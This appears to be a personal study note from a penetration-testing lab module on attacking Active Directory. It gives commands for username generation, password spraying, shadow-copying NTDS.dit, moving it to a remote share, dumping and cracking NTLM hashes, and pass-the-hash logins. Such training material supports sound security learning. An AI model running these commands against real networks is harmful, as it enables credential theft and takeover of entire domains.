> `Active Directory` (`AD`) is a common and critical directory service in modern enterprise networks. AD is something we will repeatedly encounter, so we need to be familiar with various methods we can use to attack & defend these AD environments. It is safe to conclude that if the organization uses Windows, then AD is used to manage those Windows systems. Attacking AD is such an extensive & significant topic that we have multiple modules covering AD.

>In this section, we will focus primarily on how we can extract credentials through the use of a `dictionary attack against AD accounts` and `dumping hashes` from the `NTDS.dit` file.

This module is similar to [[Attacking LSASS]] as we will encounter NTDS file that contains information about the Directory Service 

#### Creating a Custom list of Usernames

```
$ ./username-anarchy --list-formats

first               	anna
firstlast           	annakey
first.last          	anna.key
firstlast[8]        	annakey
firstl              	annak
f.last              	a.key
flast               	akey
lfirst              	kanna
l.first             	k.anna
lastf               	keya
last                	key
last.f              	key.a
last.first          	key.anna
FLast               	AKey
first1              	anna0,anna1,anna2
fl                  	ak
fmlast              	abkey
firstmiddlelast     	annaboomkey
fml                 	abk
FL                  	AK
FirstLast           	AnnaKey
First.Last          	Anna.Key
Last                	Key
FML                 	ABK


```

```
$ ./username-anarchy --input-file ./test-names.txt  --select-format first.last
andrew.horton
jim.vongrippenvud
peter.otoole
```

 #username-anarchy #cracking #usernames

#### Launching the Attack with CrackMapExec

```
$ crackmapexec smb 10.129.201.57 -u bwilliamson -p /usr/share/wordlists/fasttrack.txt
```

#crackmapexec #smb #username-anarchy 

## Capturing NTDS.dit

>`NT Directory Services` (`NTDS`) is the directory service used with AD to find & organize network resources. Recall that `NTDS.dit` file is stored at `%systemroot$/ntds` on the domain controllers in a [forest](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/using-the-organizational-domain-forest-model). The `.dit` stands for [directory information tree](https://docs.oracle.com/cd/E19901-01/817-7607/dit.html). This is the primary database file associated with AD and stores all domain usernames, password hashes, and other critical schema information. If this file can be captured, we could potentially compromise every account on the domain similar to the technique we covered in this module's `Attacking SAM` section. As we practice this technique, consider the importance of protecting AD and brainstorm a few ways to stop this attack from happening.

```
$ evil-winrm -i 10.129.201.57  -u bwilliamson -p 'P@55w0rd!'
```

#evil-winrm 

#### Checking Local Group Membership && User Account Privileges including Domain

```c
*Evil-WinRM* PS C:\> net localgroup
*Evil-WinRM* PS C:\> net user bwilliamson


Local Group Memberships
Global Group memberships     *Domain Users         *Domain Admins
The command completed successfully.


```

This account has both Administrators and Domain Administrator rights which means we can do just about anything we want, including making a copy of the NTDS.dit file.

#ntds #net 

#### Creating Shadow Copy of C:

> We can use `vssadmin` to create a [Volume Shadow Copy](https://docs.microsoft.com/en-us/windows-server/storage/file-server/volume-shadow-copy-service) (`VSS`) of the C: drive or whatever volume the admin chose when initially installing AD. It is very likely that NTDS will be stored on C: as that is the default location selected at install, but it is possible to change the location. We use VSS for this because it is designed to make copies of volumes that may be read & written to actively without needing to bring a particular application or system down. VSS is used by many different backup & disaster recovery software to perform operations.

```c
*Evil-WinRM* PS C:\> vssadmin CREATE SHADOW /For=C:
```


```c
*Evil-WinRM* PS C:\NTDS> cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
```


```c
*Evil-WinRM* PS C:\NTDS> cmd.exe /c move C:\NTDS\NTDS.dit \\10.10.15.30\CompData 
```

#evil-winrm #ntds #impacket #impacket_share
#sam_transfer 

#### A Faster Method: Using CrackMapExec to Capture NTDS.dit


```
$ crackmapexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! --ntds
```

#crackmapexec #ntds #dumping #ntlm 

We can then use Hashcat to crack the output dumped from CrackMapExec

```
sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt
```

And use Pass the Hash attack:

```
$ evil-winrm -i 10.129.201.57  -u  Administrator -H "64f12cddaa88057e06a81b54e73b949b"
```

#hashcat #cracking #pth #ntlm #evil-winrm 

